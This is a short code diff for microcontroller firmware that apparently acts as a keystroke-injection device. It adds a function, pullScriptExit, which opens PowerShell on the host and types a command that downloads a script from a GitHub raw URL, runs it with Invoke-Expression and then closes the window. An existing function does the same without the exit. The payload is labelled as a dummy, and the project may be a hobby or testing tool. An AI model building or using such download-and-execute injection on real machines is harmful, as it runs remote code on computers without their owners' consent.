@@ -31,6 +31,12 @@ void KEYBOARD::pullScript() {
     Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
     Serial1.println("#Roger Roger#");
 }
+void KEYBOARD::pullScriptExit() {
+    KEYBOARD::openPS();
+    delay(500);
+    Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content); exit");
+    Serial1.println("#Roger Roger#");
+}
 
 void KEYBOARD::runPayload(String payload) {
     KEYBOARD::openPS();
